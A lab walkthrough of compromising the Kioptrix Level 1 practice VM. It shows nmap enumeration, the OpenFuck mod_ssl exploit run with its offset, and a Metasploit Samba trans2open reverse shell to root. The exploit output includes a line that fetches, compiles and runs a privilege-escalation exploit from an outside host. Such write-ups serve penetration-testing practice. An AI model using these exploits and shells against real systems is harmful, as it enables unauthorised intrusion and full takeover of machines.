---
title: "Kioptix Level 1"
date: 2022-05-05T17:53:43+01:00
tags: enumeration
category: pentest
keywords:
 - nmap
 - nikto
 - metasploit
---

# 1. Pre-Enumeration phase:

Nothing to do here. When you start a VM, the IP address is usually shown on
one of the interfaces. In my case, the VM is running at *192.168.122.203*.
To avoid memorizing it, and since this is a single machine, I've modified my
*/etc/hosts* file to include the following:

{{< highlight plaintext >}}
192.168.122.203		lan_kioptix
{{< / highlight >}}

Now, my computer will understand *lan_kioptix* is an address that points to
our vulnerable VM, and will redirect all requests directed at this address to
the VM.

# 2. Enumeration phase:

As usual, when we don't know anything about the machine, we start by doing a
UDP/TCP scan of the open ports. Since a UDP scan takes longer, we run these
scans separately, and we begin analyzing the results of the TCP scan even
while the UDP scan is ongoing.

{{< highlight bash >}}
# Run these on 2 different terminals
$ nmap -A -O -T4 -sU --top-ports 1000 -vvv -oN 01_nmap.udp lan_kioptix
$ nmap -A -O -T4 -sS -p1-65535 -vvv -oN 01_nmap.tcp lan_kioptix
{{< / highlight >}}

The TCP scan will give us the following

{{< highlight plaintext >}}
# Nmap 7.92 scan initiated Sun May  1 19:41:29 2022 as: nmap -A -O -T4 -sS -p1-65535 -vvv -oN 01_nmap.tcp lan_kioptix
Nmap scan report for lan_kioptix (192.168.122.203)
Host is up, received arp-response (0.00063s latency).
Scanned at 2022-05-01 19:41:30 WEST for 26s
Not shown: 65529 closed tcp ports (reset)
PORT      STATE SERVICE     REASON         VERSION
22/tcp    open  ssh         syn-ack ttl 64 OpenSSH 2.9p2 (protocol 1.99)
|_sshv1: Server supports SSHv1
| ssh-hostkey: 
|   1024 b8:74:6c:db:fd:8b:e6:66:e9:2a:2b:df:5e:6f:64:86 (RSA1)
| 1024 35 109482092953601530927446985143812377560925655194254170270380314520841776849335628258408994190413716152105684423280369467219093526740118507720167655934779634416983599247086840099503203800281526143567271862466057363705861760702664279290804439502645034586412570490614431533437479630834594344497670338190191879537
|   1024 8f:8e:5b:81:ed:21:ab:c1:80:e1:57:a3:3c:85:c4:71 (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBAKtycvxuV/e7s2cN74HyTZXHXiBrwyiZe/PKT/inuT5NDSQTPsGiyJZU4gefPAsYKSw5wLe28TDlZWHAdXpNdwyn4QrFQBjwFR+8WbFiAZBoWlSfQPR2RQW8i32Y2P2V79p4mu742HtWBz0hTjkd9qL5j8KCUPDfY9hzDuViWy7PAAAAFQCY9bvq+5rs1OpY5/DGsGx0k6CqGwAAAIBVpBtIHbhvoQdN0WPe8d6OzTTFvdNRa8pWKzV1Hpw+e3qsC4LYHAy1NoeaqK8uJP9203MEkxrd2OoBJKn/8EXlKAco7vC1dr/QWae+NEkI1a38x0Ml545vHAGFaVUWkffHekjhR476Uq4N4qeLfFp5B+v+9flLxYVYsY/ymJKpNgAAAIEApyjrqjgX0AE4fSBFntGFWM3j5M3lc5jw/0qufXlHJu8sZG0FRf9wTI6HlJHHsIKHA7FZ33vGLq3TRmvZucJZ0l55fV2ASS9uvQRE+c8P6w72YCzgJN7v4hYXxnY4RiWvINjW/F6ApQEUJc742i6Fn54FEYAIy5goatGFMwpVq3Q=
|   1024 ed:4e:a9:4a:06:14:ff:15:14:ce:da:3a:80:db:e2:81 (RSA)
|_ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAIEAvv8UUWsrO7+VCG/rTWY72jElft4WXfXGWybh141E8XnWxMCu+R1qdocxhh+4Clz8wO9beuZzG1rjlAD+XHiR3j2P+sw6UODeyBkuP24a+7V8P5nu9ksKD1fA83RyelgSgRJNQgPfFU3gngNno1yN6ossqkcMQTI1CY5nF6iYePs=
80/tcp    open  http        syn-ack ttl 64 Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
| http-methods: 
|   Supported Methods: GET HEAD OPTIONS TRACE
|_  Potentially risky methods: TRACE
|_http-title: Test Page for the Apache Web Server on Red Hat Linux
111/tcp   open  rpcbind     syn-ack ttl 64 2 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100024  1          32768/tcp   status
|_  100024  1          32768/udp   status
139/tcp   open  netbios-ssn syn-ack ttl 64 Samba smbd (workgroup: MYGROUP)
443/tcp   open  ssl/https   syn-ack ttl 64 Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
|_ssl-date: 2022-05-01T22:41:55+00:00; +3h59m59s from scanner time.
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--/localityName=SomeCity/emailAddress=root@localhost.localdomain/organizationalUnitName=SomeOrganizationalUnit
| Issuer: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--/localityName=SomeCity/emailAddress=root@localhost.localdomain/organizationalUnitName=SomeOrganizationalUnit
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: md5WithRSAEncryption
| Not valid before: 2009-09-26T09:32:06
| Not valid after:  2010-09-26T09:32:06
| MD5:   78ce 5293 4723 e7fe c28d 74ab 42d7 02f1
| SHA-1: 9c42 91c3 bed2 a95b 983d 10ac f766 ecb9 8766 1d33
| -----BEGIN CERTIFICATE-----
| MIIEDDCCA3WgAwIBAgIBADANBgkqhkiG9w0BAQQFADCBuzELMAkGA1UEBhMCLS0x
| EjAQBgNVBAgTCVNvbWVTdGF0ZTERMA8GA1UEBxMIU29tZUNpdHkxGTAXBgNVBAoT
| EFNvbWVPcmdhbml6YXRpb24xHzAdBgNVBAsTFlNvbWVPcmdhbml6YXRpb25hbFVu
| aXQxHjAcBgNVBAMTFWxvY2FsaG9zdC5sb2NhbGRvbWFpbjEpMCcGCSqGSIb3DQEJ
| ARYacm9vdEBsb2NhbGhvc3QubG9jYWxkb21haW4wHhcNMDkwOTI2MDkzMjA2WhcN
| MTAwOTI2MDkzMjA2WjCBuzELMAkGA1UEBhMCLS0xEjAQBgNVBAgTCVNvbWVTdGF0
| ZTERMA8GA1UEBxMIU29tZUNpdHkxGTAXBgNVBAoTEFNvbWVPcmdhbml6YXRpb24x
| HzAdBgNVBAsTFlNvbWVPcmdhbml6YXRpb25hbFVuaXQxHjAcBgNVBAMTFWxvY2Fs
| aG9zdC5sb2NhbGRvbWFpbjEpMCcGCSqGSIb3DQEJARYacm9vdEBsb2NhbGhvc3Qu
| bG9jYWxkb21haW4wgZ8wDQYJKoZIhvcNAQEBBQADgY0AMIGJAoGBAM4BXiK5bWlS
| ob4B6a9ALmKDbSxqoMcM3pvGHscFsJs+fHHn+CjU1DX44LPDNOwwOl6Uqb+GtZJv
| 6juVetDwcTbbocC2BM+6x6gyV/H6aYuCssCwrOuVKWp7l9xVpadjITUmhh+uB81q
| yqopt//Z4THww7SezLJQXi1+Grmp3iFDAgMBAAGjggEcMIIBGDAdBgNVHQ4EFgQU
| 7OdRS0NrbNB8gE9qUjcw8LF8xKAwgegGA1UdIwSB4DCB3YAU7OdRS0NrbNB8gE9q
| Ujcw8LF8xKChgcGkgb4wgbsxCzAJBgNVBAYTAi0tMRIwEAYDVQQIEwlTb21lU3Rh
| dGUxETAPBgNVBAcTCFNvbWVDaXR5MRkwFwYDVQQKExBTb21lT3JnYW5pemF0aW9u
| MR8wHQYDVQQLExZTb21lT3JnYW5pemF0aW9uYWxVbml0MR4wHAYDVQQDExVsb2Nh
| bGhvc3QubG9jYWxkb21haW4xKTAnBgkqhkiG9w0BCQEWGnJvb3RAbG9jYWxob3N0
| LmxvY2FsZG9tYWluggEAMAwGA1UdEwQFMAMBAf8wDQYJKoZIhvcNAQEEBQADgYEA
| Vgrmpprfkmd8vy0E0UmZvWdIcDrIYRvUWcwSFwc6bGqJeJr0CYSB+jDQzA6Cu7nt
| xjrlXxEjHFBBbF4iEMJDnuQTFGvICQIcrqJoH3lqAO73u4TeBDjhv5n+h+S37CHd
| 1lvgRgoOay9dWaLKOyUThgKF2HcPWMZIj2froo5eihM=
|_-----END CERTIFICATE-----
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_DES_64_CBC_WITH_MD5
|     SSL2_RC4_64_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|_    SSL2_RC2_128_CBC_WITH_MD5
|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
|_http-title: 400 Bad Request
| http-methods: 
|_  Supported Methods: GET HEAD POST
32768/tcp open  status      syn-ack ttl 64 1 (RPC #100024)
MAC Address: 52:54:00:26:0B:1C (QEMU virtual NIC)
Device type: general purpose
Running: Linux 2.4.X
OS CPE: cpe:/o:linux:linux_kernel:2.4
OS details: Linux 2.4.9 - 2.4.18 (likely embedded)
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=5/1%OT=22%CT=1%CU=38606%PV=Y%DS=1%DC=D%G=Y%M=525400%TM
OS:=626ED474%P=x86_64-pc-linux-gnu)SEQ(SP=CD%GCD=1%ISR=D2%TI=Z%CI=Z%II=I%TS
OS:=7)OPS(O1=M5B4ST11NW0%O2=M5B4ST11NW0%O3=M5B4NNT11NW0%O4=M5B4ST11NW0%O5=M
OS:5B4ST11NW0%O6=M5B4ST11)WIN(W1=16A0%W2=16A0%W3=16A0%W4=16A0%W5=16A0%W6=16
OS:A0)ECN(R=Y%DF=Y%T=40%W=16D0%O=M5B4NNSNW0%CC=N%Q=)T1(R=Y%DF=Y%T=40%S=O%A=
OS:S+%F=AS%RD=0%Q=)T2(R=N)T3(R=Y%DF=Y%T=40%W=16A0%S=O%A=S+%F=AS%O=M5B4ST11N
OS:W0%RD=0%Q=)T4(R=Y%DF=Y%T=FF%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=FF%
OS:W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=FF%W=0%S=A%A=Z%F=R%O=%RD=0%Q=
OS:)T7(R=Y%DF=Y%T=FF%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=FF%IPL=164%
OS:UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=FF%CD=S)

Uptime guess: 0.007 days (since Sun May  1 19:31:56 2022)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=205 (Good luck!)
IP ID Sequence Generation: All zeros

Host script results:
|_clock-skew: 3h59m58s
|_smb2-time: Protocol negotiation failed (SMB2)
|_smb2-security-mode: Couldn't establish a SMBv2 connection.
| nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   KIOPTRIX<00>         Flags: <unique><active>
|   KIOPTRIX<03>         Flags: <unique><active>
|   KIOPTRIX<20>         Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   MYGROUP<00>          Flags: <group><active>
|   MYGROUP<1d>          Flags: <unique><active>
|   MYGROUP<1e>          Flags: <group><active>
| Statistics:
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 14216/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 44853/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 49676/udp): CLEAN (Timeout)
|   Check 4 (port 52763/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked

TRACEROUTE
HOP RTT     ADDRESS
1   0.63 ms lan_kioptix (192.168.122.203)

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun May  1 19:41:56 2022 -- 1 IP address (1 host up) scanned in 26.63 seconds
{{< / highlight >}}

We can see that the ports *22, 80, 111, 139 and 443* are open. My first
instinct after enumerating open ports is searching on exploit-db whether or
not there are public exploits for the services running on the machine. So I
tried searching for:

- OpenSSH 2.9p2 (no exploits found)
- Apache 1.3.20 (no exploits found)
- mod_ssl 2.8.4 (found OpenFuck exploit)
- We can continue to enumerate other services in case this one does not work.

I ended up using exploit 47080 from exploit-db. This exploit needs us to tell
him which version of the server we are attacking, as shown by it's usage
message:

{{< highlight plaintext >}}
******************************************************************
* OpenFuck v3.0.4-root priv8 by SPABAM based on openssl-too-open  *
******************************************************************
* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *
* #hackarena  irc.brasnet.org                                     *
* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *
* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *
* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *
******************************************************************

: Usage: ./47080 target box [port] [-c N]

  target - supported box eg: 0x00
  box - hostname or IP address
  port - port for ssl connection
  -c open N connections. (use range 40-50 if u dont know)
  

  Supported OffSet:
	0x00 - Caldera OpenLinux (apache-1.3.26)
	0x01 - Cobalt Sun 6.0 (apache-1.3.12)
	0x02 - Cobalt Sun 6.0 (apache-1.3.20)
	0x03 - Cobalt Sun x (apache-1.3.26)
	0x04 - Cobalt Sun x Fixed2 (apache-1.3.26)
	0x05 - Conectiva 4 (apache-1.3.6)
	0x06 - Conectiva 4.1 (apache-1.3.9)
	0x07 - Conectiva 6 (apache-1.3.14)
	0x08 - Conectiva 7 (apache-1.3.12)
	0x09 - Conectiva 7 (apache-1.3.19)
	0x0a - Conectiva 7/8 (apache-1.3.26)
	0x0b - Conectiva 8 (apache-1.3.22)
	0x0c - Debian GNU Linux 2.2 Potato (apache_1.3.9-14.1)
	0x0d - Debian GNU Linux (apache_1.3.19-1)
	0x0e - Debian GNU Linux (apache_1.3.22-2)
	0x0f - Debian GNU Linux (apache-1.3.22-2.1)
	0x10 - Debian GNU Linux (apache-1.3.22-5)
	0x11 - Debian GNU Linux (apache_1.3.23-1)
	0x12 - Debian GNU Linux (apache_1.3.24-2.1)
	0x13 - Debian Linux GNU Linux 2 (apache_1.3.24-2.1)
	0x14 - Debian GNU Linux (apache_1.3.24-3)
	0x15 - Debian GNU Linux (apache-1.3.26-1)
	0x16 - Debian GNU Linux 3.0 Woody (apache-1.3.26-1)
	0x17 - Debian GNU Linux (apache-1.3.27)
	0x18 - FreeBSD (apache-1.3.9)
	0x19 - FreeBSD (apache-1.3.11)
	0x1a - FreeBSD (apache-1.3.12.1.40)
	0x1b - FreeBSD (apache-1.3.12.1.40)
	0x1c - FreeBSD (apache-1.3.12.1.40)
	0x1d - FreeBSD (apache-1.3.12.1.40_1)
	0x1e - FreeBSD (apache-1.3.12)
	0x1f - FreeBSD (apache-1.3.14)
	0x20 - FreeBSD (apache-1.3.14)
	0x21 - FreeBSD (apache-1.3.14)
	0x22 - FreeBSD (apache-1.3.14)
	0x23 - FreeBSD (apache-1.3.14)
	0x24 - FreeBSD (apache-1.3.17_1)
	0x25 - FreeBSD (apache-1.3.19)
	0x26 - FreeBSD (apache-1.3.19_1)
	0x27 - FreeBSD (apache-1.3.20)
	0x28 - FreeBSD (apache-1.3.20)
	0x29 - FreeBSD (apache-1.3.20+2.8.4)
	0x2a - FreeBSD (apache-1.3.20_1)
	0x2b - FreeBSD (apache-1.3.22)
	0x2c - FreeBSD (apache-1.3.22_7)
	0x2d - FreeBSD (apache_fp-1.3.23)
	0x2e - FreeBSD (apache-1.3.24_7)
	0x2f - FreeBSD (apache-1.3.24+2.8.8)
	0x30 - FreeBSD 4.6.2-Release-p6 (apache-1.3.26)
	0x31 - FreeBSD 4.6-Realease (apache-1.3.26)
	0x32 - FreeBSD (apache-1.3.27)
	0x33 - Gentoo Linux (apache-1.3.24-r2)
	0x34 - Linux Generic (apache-1.3.14)
	0x35 - Mandrake Linux X.x (apache-1.3.22-10.1mdk)
	0x36 - Mandrake Linux 7.1 (apache-1.3.14-2)
	0x37 - Mandrake Linux 7.1 (apache-1.3.22-1.4mdk)
	0x38 - Mandrake Linux 7.2 (apache-1.3.14-2mdk)
	0x39 - Mandrake Linux 7.2 (apache-1.3.14) 2
	0x3a - Mandrake Linux 7.2 (apache-1.3.20-5.1mdk)
	0x3b - Mandrake Linux 7.2 (apache-1.3.20-5.2mdk)
	0x3c - Mandrake Linux 7.2 (apache-1.3.22-1.3mdk)
	0x3d - Mandrake Linux 7.2 (apache-1.3.22-10.2mdk)
	0x3e - Mandrake Linux 8.0 (apache-1.3.19-3)
	0x3f - Mandrake Linux 8.1 (apache-1.3.20-3)
	0x40 - Mandrake Linux 8.2 (apache-1.3.23-4)
	0x41 - Mandrake Linux 8.2 #2 (apache-1.3.23-4)
	0x42 - Mandrake Linux 8.2 (apache-1.3.24)
	0x43 - Mandrake Linux 9 (apache-1.3.26)
	0x44 - RedHat Linux ?.? GENERIC (apache-1.3.12-1)
	0x45 - RedHat Linux TEST1 (apache-1.3.12-1)
	0x46 - RedHat Linux TEST2 (apache-1.3.12-1)
	0x47 - RedHat Linux GENERIC (marumbi) (apache-1.2.6-5)
	0x48 - RedHat Linux 4.2 (apache-1.1.3-3)
	0x49 - RedHat Linux 5.0 (apache-1.2.4-4)
	0x4a - RedHat Linux 5.1-Update (apache-1.2.6)
	0x4b - RedHat Linux 5.1 (apache-1.2.6-4)
	0x4c - RedHat Linux 5.2 (apache-1.3.3-1)
	0x4d - RedHat Linux 5.2-Update (apache-1.3.14-2.5.x)
	0x4e - RedHat Linux 6.0 (apache-1.3.6-7)
	0x4f - RedHat Linux 6.0 (apache-1.3.6-7)
	0x50 - RedHat Linux 6.0-Update (apache-1.3.14-2.6.2)
	0x51 - RedHat Linux 6.0 Update (apache-1.3.24)
	0x52 - RedHat Linux 6.1 (apache-1.3.9-4)1
	0x53 - RedHat Linux 6.1 (apache-1.3.9-4)2
	0x54 - RedHat Linux 6.1-Update (apache-1.3.14-2.6.2)
	0x55 - RedHat Linux 6.1-fp2000 (apache-1.3.26)
	0x56 - RedHat Linux 6.2 (apache-1.3.12-2)1
	0x57 - RedHat Linux 6.2 (apache-1.3.12-2)2
	0x58 - RedHat Linux 6.2 mod(apache-1.3.12-2)3
	0x59 - RedHat Linux 6.2 update (apache-1.3.22-5.6)1
	0x5a - RedHat Linux 6.2-Update (apache-1.3.22-5.6)2
	0x5b - Redhat Linux 7.x (apache-1.3.22)
	0x5c - RedHat Linux 7.x (apache-1.3.26-1)
	0x5d - RedHat Linux 7.x (apache-1.3.27)
	0x5e - RedHat Linux 7.0 (apache-1.3.12-25)1
	0x5f - RedHat Linux 7.0 (apache-1.3.12-25)2
	0x60 - RedHat Linux 7.0 (apache-1.3.14-2)
	0x61 - RedHat Linux 7.0-Update (apache-1.3.22-5.7.1)
	0x62 - RedHat Linux 7.0-7.1 update (apache-1.3.22-5.7.1)
	0x63 - RedHat Linux 7.0-Update (apache-1.3.27-1.7.1)
	0x64 - RedHat Linux 7.1 (apache-1.3.19-5)1
	0x65 - RedHat Linux 7.1 (apache-1.3.19-5)2
	0x66 - RedHat Linux 7.1-7.0 update (apache-1.3.22-5.7.1)
	0x67 - RedHat Linux 7.1-Update (1.3.22-5.7.1)
	0x68 - RedHat Linux 7.1 (apache-1.3.22-src)
	0x69 - RedHat Linux 7.1-Update (1.3.27-1.7.1)
	0x6a - RedHat Linux 7.2 (apache-1.3.20-16)1
	0x6b - RedHat Linux 7.2 (apache-1.3.20-16)2
	0x6c - RedHat Linux 7.2-Update (apache-1.3.22-6)
	0x6d - RedHat Linux 7.2 (apache-1.3.24)
	0x6e - RedHat Linux 7.2 (apache-1.3.26)
	0x6f - RedHat Linux 7.2 (apache-1.3.26-snc)
	0x70 - Redhat Linux 7.2 (apache-1.3.26 w/PHP)1
	0x71 - Redhat Linux 7.2 (apache-1.3.26 w/PHP)2
	0x72 - RedHat Linux 7.2-Update (apache-1.3.27-1.7.2)
	0x73 - RedHat Linux 7.3 (apache-1.3.23-11)1
	0x74 - RedHat Linux 7.3 (apache-1.3.23-11)2
	0x75 - RedHat Linux 7.3 (apache-1.3.27)
	0x76 - RedHat Linux 8.0 (apache-1.3.27)
	0x77 - RedHat Linux 8.0-second (apache-1.3.27)
	0x78 - RedHat Linux 8.0 (apache-2.0.40)
	0x79 - Slackware Linux 4.0 (apache-1.3.6)
	0x7a - Slackware Linux 7.0 (apache-1.3.9)
	0x7b - Slackware Linux 7.0 (apache-1.3.26)
	0x7c - Slackware 7.0  (apache-1.3.26)2
	0x7d - Slackware Linux 7.1 (apache-1.3.12)
	0x7e - Slackware Linux 8.0 (apache-1.3.20)
	0x7f - Slackware Linux 8.1 (apache-1.3.24)
	0x80 - Slackware Linux 8.1 (apache-1.3.26)
	0x81 - Slackware Linux 8.1-stable (apache-1.3.26)
	0x82 - Slackware Linux (apache-1.3.27)
	0x83 - SuSE Linux 7.0 (apache-1.3.12)
	0x84 - SuSE Linux 7.1 (apache-1.3.17)
	0x85 - SuSE Linux 7.2 (apache-1.3.19)
	0x86 - SuSE Linux 7.3 (apache-1.3.20)
	0x87 - SuSE Linux 8.0 (apache-1.3.23)
	0x88 - SUSE Linux 8.0 (apache-1.3.23-120)
	0x89 - SuSE Linux 8.0 (apache-1.3.23-137)
	0x8a - Yellow Dog Linux/PPC 2.3 (apache-1.3.22-6.2.3a)

Fuck to all guys who like use lamah ddos. Read SRC to have no surprise
{{< / highlight >}}

By visiting the website we can see that it is only a test page, but
it tells us the server is running on top of Red Hat! We also know
mod_ssl's version, which is 1.3.20. This leaves us with just 2
possible offsets.

{{< highlight plaintext >}}
$ ./47080  | grep -i "redhat" | grep -i 1.3.20
        0x6a - RedHat Linux 7.2 (apache-1.3.20-16)1
        0x6b - RedHat Linux 7.2 (apache-1.3.20-16)2
{{< / highlight >}}

We can then try to run the exploit against the machine and see if it works...

{{< highlight plaintext >}}
$ ./47080 0x6b 192.168.122.203 443 -c 40

******************************************************************
* OpenFuck v3.0.4-root priv8 by SPABAM based on openssl-too-open *
******************************************************************
* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *
* #hackarena  irc.brasnet.org                                     *
* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *
* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *
* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *
******************************************************************

Connection... 40 of 40
Establishing SSL connection
cipher: 0x4043808c   ciphers: 0x80f81c8
Ready to send shellcode
Spawning shell...
bash: no job control in this shell
bash-2.05$ 
d.c; ./exploit; -kmod.c; gcc -o exploit ptrace-kmod.c -B /usr/bin; rm ptrace-kmo 
--11:53:10--  https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c
           =&gt; `ptrace-kmod.c&#x27;
Connecting to dl.packetstormsecurity.net:443... connected!

Unable to establish SSL connection.

Unable to establish SSL connection.
gcc: ptrace-kmod.c: No such file or directory
gcc: No input files
rm: cannot remove `ptrace-kmod.c&#x27;: No such file or directory
bash: ./exploit: No such file or directory
bash-2.05$ 
bash-2.05$ id
id
uid=48(apache) gid=48(apache) groups=48(apache)
bash-2.05$
{{< / highlight >}}

Which it does. We have user!

# 3. Privilege Escalation

From our minimal shell, we can continue enumerating from inside the machine. I
spent a couple hours searching for misconfigurations and passwords saved on
files, but could not find any. I then turned my attention to enumerating the
rest of the services found by nmap. One such service is samba:

{{< highlight plaintext >}}
bash-2.05$ find /usr/sbin | grep -i smb
find /usr/sbin | grep -i smb
/usr/sbin/smbd
bash-2.05$ /usr/sbin/smbd -h
/usr/sbin/smbd -h
Usage: /usr/sbin/smbd [-DaoPh?V] [-d debuglevel] [-l log basename] [-p port]
       [-O socket options] [-s services file]
        -D                    Become a daemon
        -a                    Append to log file (default)
        -o                    Overwrite log file, don&#x27;t append
        -h                    Print usage
        -?                    Print usage
        -V                    Print version
        -d debuglevel         Set the debuglevel
        -l log basename.      Basename for log/debug files
        -p port               Listen on the specified port
        -O socket options     Socket options
        -s services file.     Filename of services file

bash-2.05$ /usr/sbin/smbd -V
/usr/sbin/smbd -V
Version 2.2.1a
bash-2.05$
{{< / highlight >}}

Samba 2.2.1 if vulnerable to trans2open overflow using metasploit, as
indicated by the searchsploit command:

{{< highlight plaintext >}}
# searchsploit samba 2.2.1
-------------------------------------------------------------- ---------------------------------
 Exploit Title                                                |  Path
-------------------------------------------------------------- ---------------------------------
Samba 2.2.0 &lt; 2.2.8 (OSX) - trans2open Overflow (Metasploit)  | osx/remote/9924.rb
Samba &lt; 2.2.8 (Linux/BSD) - Remote Code Execution             | multiple/remote/10.c
Samba &lt; 3.0.20 - Remote Heap Overflow                         | linux/remote/7701.txt
Samba &lt; 3.6.2 (x86) - Denial of Service (PoC)                 | linux_x86/dos/36741.py
-------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
{{< / highlight >}}

So, we can launch metasploit and execute the exploit:

{{< highlight plaintext >}}
$ msfconsole -q
msf6 &gt; search trans2open

Matching Modules
================

   #  Name                              Disclosure Date  Rank   Check  Description
   -  ----                              ---------------  ----   -----  -----------
   0  exploit/freebsd/samba/trans2open  2003-04-07       great  No     Samba trans2open Overflow (*BSD x86)
   1  exploit/linux/samba/trans2open    2003-04-07       great  No     Samba trans2open Overflow (Linux x86)
   2  exploit/osx/samba/trans2open      2003-04-07       great  No     Samba trans2open Overflow (Mac OS X PPC)
   3  exploit/solaris/samba/trans2open  2003-04-07       great  No     Samba trans2open Overflow (Solaris SPARC)


Interact with a module by name or index. For example info 3, use 3 or use exploit/solaris/samba/trans2open

msf6 &gt; use 1
[*] No payload configured, defaulting to linux/x86/meterpreter/reverse_tcp
msf6 exploit(linux/samba/trans2open) &gt; set RHOSTS 192.168.122.203
RHOSTS =&gt; 192.168.122.203
msf6 exploit(linux/samba/trans2open) &gt; set payload linux/x86/shell_reverse_tcp
payload =&gt; linux/x86/shell_reverse_tcp
msf6 exploit(linux/samba/trans2open) &gt; run

[*] Started reverse TCP handler on 10.42.0.168:4444 
[*] 192.168.122.203:139 - Trying return address 0xbffffdfc...
[*] 192.168.122.203:139 - Trying return address 0xbffffcfc...
[*] 192.168.122.203:139 - Trying return address 0xbffffbfc...
[*] 192.168.122.203:139 - Trying return address 0xbffffafc...
[*] 192.168.122.203:139 - Trying return address 0xbffff9fc...
[*] 192.168.122.203:139 - Trying return address 0xbffff8fc...
[*] 192.168.122.203:139 - Trying return address 0xbffff7fc...
[*] 192.168.122.203:139 - Trying return address 0xbffff6fc...
[*] Command shell session 1 opened (10.42.0.168:4444 -&gt; 192.168.122.203:32822) at 2022-05-04 17:00:46 +0100

[*] Command shell session 2 opened (10.42.0.168:4444 -&gt; 192.168.122.203:32823) at 2022-05-04 17:00:47 +0100
[*] Command shell session 3 opened (10.42.0.168:4444 -&gt; 192.168.122.203:32824) at 2022-05-04 17:00:48 +0100
[*] Command shell session 4 opened (10.42.0.168:4444 -&gt; 192.168.122.203:32825) at 2022-05-04 17:00:50 +0100
id
uid=0(root) gid=0(root) groups=99(nobody)
{{< / highlight >}}

Conclusion. This machine got <b>PwN3d!</b>

